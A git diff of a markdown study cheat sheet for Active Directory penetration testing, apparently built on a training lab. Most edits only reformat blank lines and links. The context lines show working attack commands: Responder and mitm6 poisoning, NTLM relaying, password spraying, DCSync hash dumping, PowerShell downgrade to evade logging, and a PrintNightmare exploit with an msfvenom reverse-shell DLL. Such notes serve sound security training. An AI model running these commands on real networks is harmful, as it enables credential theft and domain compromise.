@@ -50,6 +50,7 @@
 | [PingCastle](https://www.pingcastle.com/documentation/)                                                                                       | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                               |
 | [Group3r](https://github.com/Group3r/Group3r)                                                                                                 | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
 | [ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                              |
+
 # Network enumeration
 
 ## Passive
@@ -122,6 +123,7 @@ Several tools can be used to attempt LLMNR & NBT-NS poisoning:
 | [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.      |
 | [Metasploit](https://www.metasploit.com/)             | Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.  |
 |                                                       |                                                                                                     |
+
 ## Responder
 
 **LLMNR Poisoning (SMB)**
@@ -157,6 +159,7 @@ responder -I eth0 -wrfFb
 - ‘-b’ = Return a Basic HTTP authentication (plaintext passwords).
 
 /etc/responder/responder.conf
+
 ```
 WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY 172.16.1.30:3128; PROXY 172.16.1.30:3141; DIRECT';}
 ```
@@ -184,7 +187,7 @@ How Responder works to poison DHCP
 - The domain does not use static IP addresses and uses DHCP to lease out IP addresses.
 - A user’s DCHP lease expires and they automatically renew a new on. For example, a user turns on their computer after turning it off for the weekend and when their system boots up, it requests an IP from DHCP.
 - We (the attacker with responder running) manage to win the race against the legit DHCP server to answers with a DHCP ACK containing invalid network settings, a valid WPAD server (Responder IP) and a short lease time of only 10 seconds.
-- The workstation gets the WPAD server injected and will issue a new DHCP request right after, Responder will let the networks DHCP server do its job and provide the legitimate network settings. 
+- The workstation gets the WPAD server injected and will issue a new DHCP request right after, Responder will let the networks DHCP server do its job and provide the legitimate network settings.
 - The computer’s IP address, username and NetNTLMv2 hash are then output into responder as they got served up in the initial request.
 - The user goes about their business as normal but hashes start flowing into
 
@@ -319,9 +322,10 @@ mitm6 -i eth0 -d juggernaut.local
 ntlmrelayx.py -6 -t ldaps://172.16.1.5 -smb2support -wh fakewpad.juggernaut.local -l gimmedaloot
 ```
 
-https://github.com/RedTeamPentesting/pretender
+<https://github.com/RedTeamPentesting/pretender>
 
-https://blog.redteam-pentesting.de/2022/introducing-pretender/
+<https://blog.redteam-pentesting.de/2022/introducing-pretender/>
+
 # Password Spraying
 
 ## Password Policies
@@ -423,7 +427,7 @@ sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc657
 
 Using DomainPasswordSpray.ps1
 
-https://github.com/dafthack/DomainPasswordSpray
+<https://github.com/dafthack/DomainPasswordSpray>
 
 ```powershell
 PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
@@ -433,16 +437,19 @@ PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success 
 # Enumerating Security Controls
 
 ## Windows Defender
+
 ```powershell
 PS C:\htb> Get-MpComputerStatus
 ```
 
 ## AppLocker
+
 ```powershell
 PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
 ## PowerShell Constrained Language Mode
+
 ```powershell
 PS C:\htb> $ExecutionContext.SessionState.LanguageMode
 ```
@@ -581,8 +588,8 @@ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmc
 
 The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.
 
-It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. 
-https://github.com/Fox-IT/BloodHound.py
+It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member.
+<https://github.com/Fox-IT/BloodHound.py>
 
 Collector
 
@@ -600,48 +607,56 @@ sudo neo4j start
 bloodhound
 ```
 
-https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
+<https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/>
 
 # Credentialed Enumeration - from Windows
 
 ## ActiveDirectory PowerShell Module
 
 Discover Modules
+
 ```powershell
 PS C:\htb> Get-Module
 ```
 
 Load ActiveDirectory Module
+
 ```powershell
 PS C:\htb> Import-Module ActiveDirectory
 ```
 
 Get Domain Info
+
 ```powershell
 PS C:\htb> Get-ADDomain
 ```
 
 Get-ADUser
+
 ```powershell
 PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
 Checking For Trust Relationships
+
 ```powershell
 PS C:\htb> Get-ADTrust -Filter *
 ```
 
 Group Enumeration
+
 ```powershell
 PS C:\htb> Get-ADGroup -Filter * | select name
 ```
 
 Detailed Group Info
+
 ```powershell
 PS C:\htb> Get-ADGroup -Identity "Backup Operators"
 ```
 
 Group Membership
+
 ```powershell
 PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
 ```
@@ -649,26 +664,31 @@ PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
 ## PowerView
 
 Domain User Information
+
 ```powershell
 PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
 ```
 
 Recursive Group Membership
+
 ```powershell
 PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 ```
 
 Trust Enumeration
+
 ```powershell
 PS C:\htb> Get-DomainTrustMapping
 ```
 
 Testing for Local Admin Access
+
 ```powershell
 PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
 ```
 
 Finding Users With SPN Set
+
 ```powershell
 PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ```
@@ -712,6 +732,7 @@ PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
 |`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
 |`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
 |`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|
+
 ## Downgrade Powershell
 
 With [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0.
@@ -723,11 +744,13 @@ PS C:\htb> powershell.exe -version 2
 ## Checking Defenses
 
 Firewall Checks
+
 ```powershell
 PS C:\htb> netsh advfirewall show allprofiles
 ```
 
 Windows Defender Check (from CMD.exe)
+
 ```shell
 C:\htb> sc query windefend
 ```
@@ -735,6 +758,7 @@ C:\htb> sc query windefend
 Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.
 
 Get-MpComputerStatus
+
 ```powershell
 PS C:\htb> Get-MpComputerStatus
 ```
@@ -742,6 +766,7 @@ PS C:\htb> Get-MpComputerStatus
 ## Am I Alone?
 
 Using qwinsta
+
 ```powershell
 PS C:\htb> qwinsta
 ```
@@ -1052,8 +1077,6 @@ To perform this attack, you must have control over an account that has the right
 
 DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.
 
-
-
 ## secretsdump.py
 
 Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
@@ -1178,15 +1201,15 @@ SQL> enable_xp_cmdshell
 
 ## Zerologon
 
-https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/
+<https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/>
 
-Test https://github.com/SecuraBV/CVE-2020-1472
+Test <https://github.com/SecuraBV/CVE-2020-1472>
 
-Exploit https://github.com/dirkjanm/CVE-2020-1472
+Exploit <https://github.com/dirkjanm/CVE-2020-1472>
 
 ## DCShadow
 
-https://blog.netwrix.com/2022/09/28/dcshadow_attack/
+<https://blog.netwrix.com/2022/09/28/dcshadow_attack/>
 
 ## NoPac (SamAccountName Spoofing)
 
@@ -1207,21 +1230,25 @@ We can use this [tool](https://github.com/Ridter/noPac) to perform this attack.
 Exploit: [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
 
 Enumerating for MS-RPRN
+
 ```shell
 rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 ```
 
 Generating a DLL Payload
+
 ```shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
 ```
 
 Creating a Share with smbserver.py
+
 ```shell
 sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 ```
 
 Configuring & Starting MSF multi/handler
+
 ```shell
 [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -1237,6 +1264,7 @@ LPORT => 8080
 ```
 
 Running the Exploit
+
 ```shell
 sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
 ```
@@ -1513,7 +1541,7 @@ netdom query /domain:inlanefreight.local workstation
 
 ## Attacking Domain Trusts - Child -> Parent Trusts - from Windows
 
-**SID History Primer**: 
+**SID History Primer**:
 
 The `sidHistory` attribute is used during domain migrations to maintain access to resources by storing the original Security Identifier (SID) in the new domain account.
 
@@ -1526,6 +1554,7 @@ This attack targets parent domains after compromising a child domain within the 
 By setting the `sidHistory` of a user in the child domain to include the SID of the Enterprise Admins group from the parent domain, attackers can gain administrative access to the entire forest.
 
 The attack requires specific data:
+
 - KRBTGT hash
 - child domain's SID
 - a target user name
